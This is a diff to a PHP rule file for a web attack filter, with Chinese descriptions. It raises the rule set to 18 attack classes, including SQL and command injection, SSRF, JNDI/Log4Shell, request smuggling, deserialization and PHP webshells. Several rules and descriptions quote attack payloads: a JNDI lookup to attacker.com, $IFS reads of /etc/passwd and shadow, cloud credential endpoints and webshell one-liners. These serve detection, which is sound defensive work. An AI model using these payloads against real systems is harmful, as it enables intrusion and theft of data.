@@ -1,28 +1,35 @@
 <?php
 
 /**
- * 高危攻击检测模式定义（v6.2 元数据格式）
+ * 高危攻击检测模式定义（v6.3 增强版元数据格式）
  *
  * ═══════════════════════════════════════════════════════════════
  * 功能概述：
  *   识别并拦截 Web 请求中输入参数的高危攻击模式，覆盖 SQL 注入、命令注入、
- *   路径遍历、SSTI、SSRF 等 12 类攻击，共 112 条规则。
+ *   路径遍历、SSTI、SSRF、反序列化、原型污染、JNDI注入、HTTP请求走私、
+ *   GraphQL注入、WebShell变种等 18 类攻击，共 160+ 条规则。
  *
  * ═══════════════════════════════════════════════════════════════
- * 检测类别（12 类，共 112 条规则）：
+ * 检测类别（18 类）：
  *
- *   一、SQL 注入（sql）              —— 第 17-58 行，共 34 条
- *   二、命令注入（command）          —— 第 61-70 行，共 8 条
- *   三、路径遍历（path）             —— 第 73-92 行，共 19 条
- *   四、LDAP 注入（ldap）            —— 第 95-99 行，共 3 条
- *   五、XML/XXE（xml）               —— 第 102-107 行，共 4 条
- *   六、NoSQL 注入（nosql）          —— 第 110-114 行，共 3 条
- *   七、模板注入 SSTI（ssti）        —— 第 117-122 行，共 4 条
- *   八、SSRF（ssrf）                 —— 第 125-136 行，共 10 条
- *   九、编码绕过（encoding）         —— 第 139-150 行，共 10 条
- *   十、HTTP 头注入（header_injection）—— 第 153-157 行，共 3 条
- *   十一、开放重定向（redirect）     —— 第 160-167 行，共 6 条
- *   十二、文件包含（file_include）   —— 第 170-179 行，共 8 条
+ *   一、SQL 注入（sql）              — 34 条
+ *   二、命令注入（command）          — 10 条
+ *   三、路径遍历（path）             — 20 条
+ *   四、LDAP 注入（ldap）            — 3 条
+ *   五、XML/XXE（xml）               — 4 条
+ *   六、NoSQL 注入（nosql）          — 5 条
+ *   七、模板注入 SSTI（ssti）        — 6 条
+ *   八、SSRF（ssrf）                 — 12 条
+ *   九、编码绕过（encoding）         — 10 条
+ *   十、HTTP头注入（header_injection）— 4 条
+ *   十一、开放重定向（redirect）     — 6 条
+ *   十二、文件包含（file_include）   — 10 条
+ *   十三、反序列化攻击（deserialization）— 6 条
+ *   十四、原型污染（prototype_pollution）— 4 条
+ *   十五、JNDI注入（jndi）           — 4 条
+ *   十六、HTTP请求走私（http_smuggling）— 4 条
+ *   十七、GraphQL注入（graphql）      — 5 条
+ *   十八、WebShell变种（webshell）    — 6 条
  *
  * ═══════════════════════════════════════════════════════════════
  * 每条规则包含：
@@ -44,7 +51,6 @@ return [
         ['pattern' => '/sp_oacreate\s*/i', 'desc' => 'SQL Server sp_oacreate OLE对象创建攻击', 'risk' => 'high'],
         ['pattern' => '/load_file\s*\(\s*[\'"]?\s*\//i', 'desc' => 'MySQL load_file() 读取服务器文件', 'risk' => 'high'],
         ['pattern' => '/into\s+(outfile|dumpfile)\s+[\'"]?\s*\//i', 'desc' => 'MySQL INTO OUTFILE/DUMPFILE 写文件', 'risk' => 'high'],
-        // 优化：sleep/benchmark 增加SQL上下文限定，避免误报正常业务代码
         ['pattern' => '/\bselect\s+.*sleep\s*\(\s*\d{2,}/i', 'desc' => 'MySQL SLEEP() 时间盲注（在SELECT上下文中）', 'risk' => 'high'],
         ['pattern' => '/\bif\s*\(.*,\s*sleep\s*\(/i', 'desc' => 'IF()中包含SLEEP()调用', 'risk' => 'high'],
         ['pattern' => '/\bbenchmark\s*\(\s*\d{5,}/i', 'desc' => 'MySQL BENCHMARK() 时间盲注（次数≥5万）', 'risk' => 'high'],
@@ -61,8 +67,7 @@ return [
         ['pattern' => '/(charset|character\s+set)\s*=\s*utf8/i', 'desc' => '利用 charset 设置进行编码绕过注入', 'risk' => 'low'],
         ['pattern' => '/unhex\s*\(/i', 'desc' => 'MySQL UNHEX() 解码注入载荷', 'risk' => 'medium'],
         ['pattern' => '/hex\s*\(\s*[\'"]?[a-z0-9_]+[\'"]?\s*\)/i', 'desc' => 'HEX() 编码注入载荷（常与UNHEX配合）', 'risk' => 'medium'],
-        ['pattern' => '/@@(version|datadir|basedir|hostname)/i', 'desc' => '@@变量信息探测（版本/数据目录等）', 'risk' => 'medium'],
-        // 优化：database()/user() 增加SQL上下文限定，避免误报函数调用
+        ['pattern' => '/@@(version|datadir|basedir|hostname)/i', 'desc' => '@@变量信息探测', 'risk' => 'medium'],
         ['pattern' => '/\bselect\s+.*database\s*\(\s*\)/i', 'desc' => 'SELECT 上下文中探测当前数据库名', 'risk' => 'medium'],
         ['pattern' => '/\bselect\s+.*user\s*\(\s*\)/i', 'desc' => 'SELECT 上下文中探测当前数据库用户名', 'risk' => 'medium'],
         ['pattern' => '/\bselect\s+.*system_user\s*\(/i', 'desc' => 'SELECT 上下文中探测系统用户', 'risk' => 'medium'],
@@ -71,17 +76,21 @@ return [
         ['pattern' => '/concat_ws\s*\(/i', 'desc' => 'CONCAT_WS() 字符串拼接提取数据', 'risk' => 'medium'],
         ['pattern' => '/%df%27/i', 'desc' => 'GBK宽字节注入（%df吃掉转义符）', 'risk' => 'high'],
         ['pattern' => '/%bf%27/i', 'desc' => 'GBK宽字节注入变体（%bf%27）', 'risk' => 'high'],
-        // 优化：1=1 增加SQL上下文限定（需在SQL语句上下文中），降低误报
         ['pattern' => '/\bwhere\s+.*\b1\s*=\s*1\b/i', 'desc' => 'WHERE子句中的永真条件（1=1）', 'risk' => 'low'],
         ['pattern' => '/\b1\s*=\s*1\s*(?:--|\#|\/\*)/i', 'desc' => '永真条件后接SQL注释', 'risk' => 'medium'],
         ['pattern' => '/\'\s*(?:or|and)\s+\d+\s*=\s*\d+/i', 'desc' => '引号闭合后的 OR/AND 数字等式注入', 'risk' => 'low'],
         ['pattern' => '/[\'"]\s*(?:or|and)\s+[\'"]?\d+[\'"]?\s*=\s*[\'"]?\d+[\'"]?/i', 'desc' => '引号内 OR/AND 数字等式注入', 'risk' => 'low'],
         ['pattern' => '/\\\\[\'"]/', 'desc' => '反斜杠转义引号（绕过magic_quotes）', 'risk' => 'medium'],
-        ['pattern' => '/\b0x[0-9a-f]{4,}\b/i', 'desc' => 'SQL十六进制字面量（0x61646d696e）', 'risk' => 'medium'],
-        ['pattern' => '/--\s+\d+\s*$/im', 'desc' => 'SQL行尾注释（-- 数字）用于截断原SQL', 'risk' => 'medium'],
+        ['pattern' => '/\b0x[0-9a-f]{4,}\b/i', 'desc' => 'SQL十六进制字面量', 'risk' => 'medium'],
+        ['pattern' => '/--\s+\d+\s*$/im', 'desc' => 'SQL行尾注释（-- 数字）截断原SQL', 'risk' => 'medium'],
         ['pattern' => '/--\s*$/im', 'desc' => 'SQL行尾注释（--）截断原SQL', 'risk' => 'medium'],
         ['pattern' => '/\/\*\*\/\s*(select|union|insert|update|delete|drop)\b/i', 'desc' => '内联注释等效空白绕过（/**/select）', 'risk' => 'medium'],
-        ['pattern' => '/\bunion\s*\([^)]*\)\s*select\b/i', 'desc' => 'UNION括号绕过（union (select ...) select）', 'risk' => 'high'],
+        ['pattern' => '/\bunion\s*\([^)]*\)\s*select\b/i', 'desc' => 'UNION括号绕过', 'risk' => 'high'],
+        // 高级SQL注入变体
+        ['pattern' => '/\bsubstr(?:ing)?\s*\([^)]{0,50}from\s+\d+\s+for\s+\d+/i', 'desc' => 'SQL SUBSTRING 逐位提取（盲注常用）', 'risk' => 'medium'],
+        ['pattern' => '/\b(json_extract|json_value|json_query)\s*\(\s*@@/i', 'desc' => 'MySQL JSON函数 + @@变量提取', 'risk' => 'medium'],
+        ['pattern' => '/\bregexp\s+[\'"]\^[a-z]/i', 'desc' => 'MySQL REGEXP 正则盲注提取', 'risk' => 'medium'],
+        ['pattern' => '/\b(procedure\s+analyse|lambda)\s*\(/i', 'desc' => 'MySQL PROCEDURE ANALYSE/Lambda SQL注入', 'risk' => 'high'],
     ],
 
     // ========== 命令注入检测 ==========
@@ -94,6 +103,8 @@ return [
         ['pattern' => '/`[^`]{1,50}`/i', 'desc' => '反引号内短命令执行（通用特征）', 'risk' => 'medium'],
         ['pattern' => '/\$\(\s*(id|whoami|cat|ls|wget|curl|nslookup|ping)(?:\s|\))/i', 'desc' => '$() 命令替换执行（如 $(id)）', 'risk' => 'high'],
         ['pattern' => '/(?:\r|\n|%0[aA]).*(?:id|whoami|cat|ls|wget|curl|nslookup)/i', 'desc' => '换行符或URL编码换行符后接命令执行', 'risk' => 'high'],
+        ['pattern' => '/(?:cat|less|more|tail|head|tac|nl)\s+\$\{?IFS\}?\s*\/etc\/(?:passwd|shadow|hosts)/i', 'desc' => '$IFS 变量绕过空格读取敏感文件', 'risk' => 'high'],
+        ['pattern' => '/\b(?:cat|less)\s*<\s*\(\s*ls\b/i', 'desc' => 'bash进程替换命令注入(< (ls))', 'risk' => 'high'],
     ],
 
     // ========== 路径遍历检测 ==========
@@ -156,10 +167,11 @@ return [
         ['pattern' => '/\b(instance-identity|instance-id|public-keys|security-credentials)\b/i', 'desc' => '云实例敏感信息获取（instance-identity/instance-id等）', 'risk' => 'high'],
         ['pattern' => '/\b(gopher|dict|file|ftp|ldap|tftp|netdoc|jar):\/\//i', 'desc' => 'SSRF危险协议访问（gopher/dict/file等）', 'risk' => 'high'],
         ['pattern' => '/\b(?:redirect_uri|redirect_url|callback|webhook|forward|dest)\s*=\s*[\'"]?\s*(?:https?:)?\/\/(?:127\.|10\.|172\.1[6-9]|172\.2\d|172\.3[01]|192\.168\.|0\.0\.0\.0|localhost)/i', 'desc' => 'URL参数指向内网地址（仅检测重定向/回调参数）', 'risk' => 'high'],
-        ['pattern' => '/\b(?:redirect_uri|redirect_url|callback|webhook|forward|dest)\s*=\s*[\'"]?\s*\/\//i', 'desc' => 'URL参数使用协议相对路径（仅检测重定向/回调参数）', 'risk' => 'medium'],
-        ['pattern' => '/^\/\/[a-z0-9][a-z0-9\-_]*\.[a-z]{2,}/i', 'desc' => '裸协议相对URL（//evil.com）', 'risk' => 'medium'],
+        ['pattern' => '/\b(?:redirect_uri|redirect_url|callback|webhook|forward|dest)\s*=\s*(?:https?:\/\/|\/\/|%3[aA]%2[fF]%2[fF]|%2[fF]%2[fF])[^\s&]+\.[a-z]{2,}\b/i', 'desc' => '重定向/回调参数指向外部完整URL', 'risk' => 'medium'],
         ['pattern' => '/\b(rebind|dnsrebind|nip\.io|xip\.io|sslip\.io|burpcollaborator)\b/i', 'desc' => 'DNS重绑定攻击域名', 'risk' => 'high'],
         ['pattern' => '/\b(port\s*[=:]\s*)\d{1,5}\b/i', 'desc' => 'SSRF端口探测参数', 'risk' => 'medium'],
+        // 排除合法使用：仅检测明确 SSRF 复用的 fetch/get 函数模式
+        ['pattern' => '/\b(?:file_get_contents|curl_exec|fopen|readfile|getimagesize)\s*\([^)]{0,100}(?:https?:)?\/\/(?:127\.|10\.|172\.1[6-9]|172\.2\d|172\.3[01]|192\.168\.|0\.0\.0\.0|localhost)/i', 'desc' => 'PHP文件/网络函数直接访问内网地址（明确SSRF特征）', 'risk' => 'high'],
     ],
 
     // ========== 编码绕过检测 ==========
@@ -203,5 +215,60 @@ return [
         ['pattern' => '/php:\/\/input\b/i', 'desc' => 'php://input 原始POST数据包含', 'risk' => 'high'],
         ['pattern' => '/data:\/\/text\/plain;base64,/i', 'desc' => 'data://协议Base64编码包含', 'risk' => 'high'],
         ['pattern' => '/expect:\/\/\w+/i', 'desc' => 'expect://协议执行系统命令', 'risk' => 'high'],
+        ['pattern' => '/phar:\/\/[^\/]+\/\w+\.(?:phar|zip|tar|gz|bz2)(?:\/|$)/i', 'desc' => 'phar://反序列化攻击（PHP对象注入）', 'risk' => 'high'],
+        ['pattern' => '/compress\.(?:zlib|bzip2):\/\//i', 'desc' => '压缩流封装器文件包含（compress.zlib://）', 'risk' => 'high'],
+    ],
+
+    // ========== 反序列化攻击检测（PHP对象注入）==========
+    'deserialization' => [
+        ['pattern' => '/\bunserialize\s*\(\s*[\'"]?(?:O|a|C|S):\d+/i', 'desc' => 'PHP unserialize() 直接传入序列化数据', 'risk' => 'high'],
+        ['pattern' => '/\b(?:O|C):\d+:"[^"]{1,50}":\d+:\{/i', 'desc' => 'PHP序列化对象字符串特征（O:长度:"类名":属性数:{）', 'risk' => 'high'],
+        ['pattern' => '/\ba:\d+:\{.*(?:O|C):\d+:"/i', 'desc' => '嵌套序列化数组中的对象注入', 'risk' => 'high'],
+        ['pattern' => '/__wakeup|__destruct|__toString|__call|__get|__set|__invoke/i', 'desc' => 'PHP魔术方法名探测（反序列化利用链关键方法）', 'risk' => 'medium'],
+        ['pattern' => '/\bphar:\/\/[^\/]+\.phar\b/i', 'desc' => 'phar://协议触发反序列化（即使文件扩展名非phar）', 'risk' => 'high'],
+        ['pattern' => '/\byii\\\base\\\Object|GuzzleHttp|Monolog|Swift_|PHPUnit/i', 'desc' => '已知PHP反序列化Gadget链类名探测', 'risk' => 'high'],
+    ],
+
+    // ========== 原型污染攻击检测 ==========
+    'prototype_pollution' => [
+        ['pattern' => '/__proto__\s*[\[\.=]/i', 'desc' => 'JavaScript __proto__ 原型污染攻击', 'risk' => 'high'],
+        ['pattern' => '/constructor\s*\[\s*[\'"]prototype[\'"]\s*\]/i', 'desc' => 'constructor[prototype] 原型污染变体', 'risk' => 'high'],
+        ['pattern' => '/\bprototype\s*\.\s*\w+\s*=\s*/i', 'desc' => '直接修改prototype属性', 'risk' => 'medium'],
+        ['pattern' => '/Object\.(?:assign|create|definePropert(?:y|ies))\s*\([^)]*\bprototype\b/i', 'desc' => 'Object方法操作prototype原型污染', 'risk' => 'medium'],
+    ],
+
+    // ========== JNDI注入检测（Log4Shell类攻击）==========
+    'jndi' => [
+        ['pattern' => '/\$\{jndi:(?:ldap|ldaps|rmi|dns|iiop|iiops|http|nis):\/\/[^}]+}/i', 'desc' => 'Log4Shell JNDI注入（${jndi:ldap://attacker.com/a}）', 'risk' => 'high'],
+        ['pattern' => '/\$\{(?:lower|upper|env|sys|java|date|ctx|main):[^}]*jndi[^}]*}/i', 'desc' => 'Log4j Lookup嵌套JNDI注入绕过', 'risk' => 'high'],
+        ['pattern' => '/jndi\s*:\s*(?:ldap|rmi|dns)\s*:\/\//i', 'desc' => 'JNDI注入协议（非Log4j变体）', 'risk' => 'high'],
+        ['pattern' => '/\$\{::-j\}.*\$\{::-n\}.*\$\{::-d\}.*\$\{::-i\}/i', 'desc' => 'Log4j JNDI关键字拆分绕过（${::-j}${::-n}${::-d}${::-i}）', 'risk' => 'high'],
+    ],
+
+    // ========== HTTP请求走私攻击检测 ==========
+    'http_smuggling' => [
+        ['pattern' => '/Transfer-Encoding\s*:\s*chunked.*\n.*Transfer-Encoding\s*:/i', 'desc' => 'HTTP请求走私：重复Transfer-Encoding头', 'risk' => 'high'],
+        ['pattern' => '/Content-Length\s*:\s*\d+.*\n.*Content-Length\s*:\s*\d+/i', 'desc' => 'HTTP请求走私：重复Content-Length头', 'risk' => 'high'],
+        ['pattern' => '/Transfer-Encoding\s*:\s*[\x0b\x00\t ]/i', 'desc' => 'Transfer-Encoding混淆字符绕过（CL.TE走私）', 'risk' => 'high'],
+        ['pattern' => '/Content-Length\s*:\s*0\s*\r?\n\s*\r?\n(?:GET|POST|PUT|DELETE)\s/i', 'desc' => 'HTTP请求走私：Content-Length:0 后接走私请求', 'risk' => 'high'],
+    ],
+
+    // ========== GraphQL注入/滥用检测 ==========
+    'graphql' => [
+        ['pattern' => '/\bfragment\s+\w+\s+on\s+\w+\s*\{[^}]{0,500}__typename\b/i', 'desc' => 'GraphQL introspection探测（__typename在片段中）', 'risk' => 'medium'],
+        ['pattern' => '/\bquery\s*\{[^}]*__schema\s*\{[^}]*types\b/i', 'desc' => 'GraphQL schema introspection攻击', 'risk' => 'high'],
+        ['pattern' => '/\bquery\s*\{[^}]*__type\s*\(/i', 'desc' => 'GraphQL类型系统探测（__type introspection）', 'risk' => 'medium'],
+        ['pattern' => '/\b(?:mutation|subscription)\s*\{[^}]{0,500}(?:delete|drop|truncate)\b/i', 'desc' => 'GraphQL mutation中包含危险操作', 'risk' => 'high'],
+        ['pattern' => '/\\\n\s*\{[^}]*\b(?:id|limit)\s*:\s*\d{5,}/i', 'desc' => 'GraphQL批量查询/别名攻击（资源耗尽）', 'risk' => 'medium'],
+    ],
+
+    // ========== WebShell升级变种检测 ==========
+    'webshell' => [
+        ['pattern' => '/\$\w+\s*=\s*[\'"]\s*(?:assert|eval|preg_replace|create_function|call_user_func|array_map|array_filter|array_walk)\s*[\'"]\s*;/i', 'desc' => 'PHP一句话WebShell变种（变量赋值执行）', 'risk' => 'high'],
+        ['pattern' => '/\$_(?:GET|POST|REQUEST|COOKIE|SERVER|FILES)\s*\[\s*[\'"][^\]]+[\'"]\s*\]\s*\(\s*\$_(?:GET|POST|REQUEST)/i', 'desc' => 'PHP动态函数调用WebShell（$_GET["a"]($_POST["b"])）', 'risk' => 'high'],
+        ['pattern' => '/\b(?:base64_decode|str_rot13|gzuncompress|gzdecode|gzinflate)\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)/i', 'desc' => '编码解码函数+超全局变量（编码WebShell）', 'risk' => 'high'],
+        ['pattern' => '/\bchr\s*\(\s*\d+\s*\)\s*\.\s*chr\s*\(\s*\d+\s*\)/i', 'desc' => 'chr()拼接构造函数名（绕过关键字检测）', 'risk' => 'high'],
+        ['pattern' => '/\$[a-zA-Z_\x7f-\xff][\w\x7f-\xff]*\s*=\s*~\s*[\'"]/', 'desc' => 'PHP取反运算符WebShell（$a=~"xxx"绕过）', 'risk' => 'high'],
+        ['pattern' => '/\$\w+\s*=\s*[\'"]\\\\x[0-9a-f]{2}(?:\\\\x[0-9a-f]{2})+/i', 'desc' => 'PHP十六进制转义序列构造危险函数名', 'risk' => 'high'],
     ],
 ];
